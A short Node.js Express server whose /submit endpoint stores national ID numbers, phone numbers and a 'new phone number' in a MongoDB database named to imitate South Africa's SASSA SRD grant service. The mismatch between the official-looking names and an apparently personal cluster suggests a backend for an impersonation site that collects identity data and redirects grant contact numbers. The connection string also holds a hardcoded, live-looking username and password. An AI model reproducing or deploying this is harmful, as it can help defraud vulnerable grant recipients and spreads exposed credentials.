
const express = require('express');
const cors = require('cors');
const { MongoClient } = require('mongodb');

const app = express();
app.use(cors());
app.use(express.json());

const uri = 'mongodb+srv://mkasigiven09:yGiI6nmIj33vDrhk@srd-sassa-gov-za.qnutzho.mongodb.net/sassa';
const client = new MongoClient(uri);

app.post('/submit', async (req, res) => {
  const { idNumber, phoneNumber, newphoneNumber } = req.body;

  try {
    await client.connect();
    const db = client.db('sassa');
    const collection = db.collection('srd');

    const exists = await collection.findOne({ idNumber, phoneNumber });
    if (exists) return res.status(409).send('Duplicate application');

    await collection.insertOne({
      idNumber,
      phoneNumber,
      newphoneNumber,
      timestamp: new Date()
    });

    res.status(200).send('Application submitted');
  } catch (err) {
    console.error(err);
    res.status(500).send('Server error');
  }
});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));
